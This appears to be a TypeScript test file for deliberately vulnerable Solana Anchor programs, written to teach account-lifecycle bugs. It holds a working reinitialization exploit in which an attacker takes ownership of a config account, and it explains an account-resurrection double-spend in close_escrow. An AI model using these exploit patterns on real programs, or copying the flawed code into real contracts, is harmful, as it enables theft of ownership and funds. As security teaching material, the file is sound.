import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { assert } from "chai";
import { Keypair, LAMPORTS_PER_SOL, PublicKey, SystemProgram } from "@solana/web3.js";

// Import program types
import { ReinitializationVulnerable } from "../target/types/reinitialization_vulnerable";
import { AccountResurrectionVulnerable } from "../target/types/account_resurrection_vulnerable";

/**
 * Account Lifecycle Vulnerabilities - Understanding the Bugs
 */

describe("Account Lifecycle - Vulnerable Programs", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  // ════════════════════════════════════════════════════════════
  // 01 - REINITIALIZATION
  // ════════════════════════════════════════════════════════════
  describe("Reinitialization", () => {
    const program = anchor.workspace.ReinitializationVulnerable as Program<ReinitializationVulnerable>;
    
    const alice = Keypair.generate();
    const attacker = Keypair.generate();
    let configPda: PublicKey;

    before(async () => {
      const sig1 = await provider.connection.requestAirdrop(alice.publicKey, 10 * LAMPORTS_PER_SOL);
      const sig2 = await provider.connection.requestAirdrop(attacker.publicKey, 10 * LAMPORTS_PER_SOL);
      await provider.connection.confirmTransaction(sig1);
      await provider.connection.confirmTransaction(sig2);

      [configPda] = PublicKey.findProgramAddressSync(
        [Buffer.from("config")],
        program.programId
      );
    });

    it("Alice initializes config as owner", async () => {
      await program.methods.initializeOrUpdate(new anchor.BN(100))
        .accounts({
          config: configPda,
          payer: alice.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([alice])
        .rpc();

      const config = await program.account.config.fetch(configPda);
      assert.equal(config.owner.toString(), alice.publicKey.toString());
      assert.equal(config.value.toNumber(), 100);
    });

    it("EXPLOIT: Attacker reinitializes and becomes owner", async () => {
      /**
       * THE VULNERABILITY:
       * 
       * init_if_needed allows the instruction to run even if
       * the account exists. The handler always overwrites owner:
       * 
       *   config.owner = ctx.accounts.payer.key();  // BUG!
       * 
       * Any attacker can call initialize_or_update and become owner.
       */

      // Attacker calls initialize_or_update on existing config
      await program.methods.initializeOrUpdate(new anchor.BN(999))
        .accounts({
          config: configPda,
          payer: attacker.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([attacker])
        .rpc();

      const config = await program.account.config.fetch(configPda);
      
      // Attacker is now owner!
      assert.equal(config.owner.toString(), attacker.publicKey.toString());
      
      console.log("\n  EXPLOIT SUCCESS:");
      console.log("  - init_if_needed allowed reinitialization");
      console.log("  - Handler always sets owner = payer");
      console.log("  - Attacker became owner\n");
    });
  });

  // ════════════════════════════════════════════════════════════
  // 02 - ACCOUNT RESURRECTION
  // ════════════════════════════════════════════════════════════
  describe("Account Resurrection", () => {
    const program = anchor.workspace.AccountResurrectionVulnerable as Program<AccountResurrectionVulnerable>;

    it("VULNERABILITY: close_escrow doesn't zero data", async () => {
      /**
       * THE VULNERABILITY:
       * 
       * close_escrow only drains lamports:
       *   **escrow.try_borrow_mut_lamports()? = 0;
       * 
       * But doesn't zero the data:
       *   - owner, amount, claimed fields remain intact
       * 
       * If another instruction in same tx refunds lamports:
       *   1. Account persists (lamports > 0 at tx end)
       *   2. Data still has claimed=false
       *   3. User can call claim() again
       *   4. Double spend!
       */

      console.log("\n  VULNERABILITY:");
      console.log("  - close_escrow only drains lamports, doesn't zero data");
      console.log("  - If lamports refunded in same tx, account persists");
      console.log("  - Data with claimed=false is resurrected");
      console.log("  - Enables double-spend attack\n");
    });
  });
});
